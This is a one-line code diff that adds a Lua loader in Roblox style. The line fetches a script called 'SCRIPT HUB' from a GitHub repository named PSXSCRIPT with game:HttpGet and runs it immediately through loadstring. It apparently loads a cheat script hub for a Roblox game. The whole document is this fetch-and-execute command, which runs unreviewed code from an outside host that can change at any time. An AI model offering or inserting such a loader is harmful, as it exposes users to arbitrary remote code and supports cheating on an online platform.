@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BobStewartSonYT/PSXSCRIPT/main/SCRIPT%20HUB", true))()
